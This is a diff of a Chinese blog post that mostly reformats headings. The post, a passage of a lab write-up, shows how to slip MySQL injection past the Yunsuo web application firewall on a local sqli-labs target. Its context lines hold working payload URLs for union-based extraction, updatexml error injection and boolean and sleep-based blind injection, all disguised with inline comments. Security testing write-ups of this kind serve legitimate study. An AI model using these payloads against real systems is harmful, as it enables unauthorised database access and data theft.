@@ -1,11 +1,9 @@
 ---
 title: "Bypass MySQL Yunsuo"
 date: 2019-10-12T22:46:46+08:00
-lastmod: 2019-10-12T22:46:46+08:00
 draft: false
 tags: []
 categories: ['bypass']
-comment: true
 ---
 
 开锁
@@ -14,7 +12,7 @@ comment: true
 
 继上文《Bypass MySQL Safedog》。
 
-# 判断注入
+## 判断注入
 
 智障云锁不拦截and or
 
@@ -23,7 +21,7 @@ http://172.16.1.157/sql/Less-1/?id=1' and 1=1 -- +	正常
 http://172.16.1.157/sql/Less-1/?id=1' and 1=2 -- +	不正常
 ```
 
-# 判断字段数
+## 判断字段数
 
 ```
 http://172.16.1.157/sql/Less-1/?id=1' order by  -- +	拦截
@@ -40,7 +38,7 @@ http://172.16.1.157/sql/Less-1/?id=1' order/*!50000by*/  3 -- +	正常
 http://172.16.1.157/sql/Less-1/?id=1' order/*!50000by*/  4 -- +	不正常
 ```
 
-# 联合查询
+## 联合查询
 
 对union select的拦截比较狠，用all/distinct/distinctrow加内联注释打乱
 
@@ -94,17 +92,17 @@ http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,
 http://172.16.1.157/sql/Less-1/?id=-1' union /*!00000all*/ /*!00000select*/ 1,2,(/*!00000select*/ email_id /*!00000from*/ emails  limit 0,1) -- +
 ```
 
-# 报错注入
+## 报错注入
 
 ```
 http://172.16.1.157/sql/Less-1/?id=-1' and /*!00000updatexml*/(1,concat(0x7e,user(),0x7e),1) -- +
 ```
 
-# 盲注
+## 盲注
 
 我手工测得时候发现云锁对盲注友好的很，对于and之后的比较运算符以及字符串截取函数几乎上不拦截，甚至是不用绕。
 
-## 布尔盲注
+### 布尔盲注
 
 判断长度
 
@@ -126,7 +124,7 @@ http://172.16.1.157/sql/Less-1/?id=1' and substr((/*!00000select*/ table_name /*
 
 可以发现跟上面联合查询一样的，只需要给关键字加内联就行了，布尔盲注就到这。
 
-## 时间盲注
+### 时间盲注
 
 写到这发现if()和sleep()都不用绕。。。
 
@@ -136,7 +134,7 @@ http://172.16.1.157/sql/Less-1/?id=1' and if((user()='root@localhost'),sleep(5),
 
 用到select的时候就用内联就完事了。
 
-# 总结
+## 总结
 
 云锁相比安全狗来讲规则弱的太多了，尤其是对于盲注的拦截，简直不要太友好，对于into outfile也不拦截，算是给安全从业人员留了后路。
 
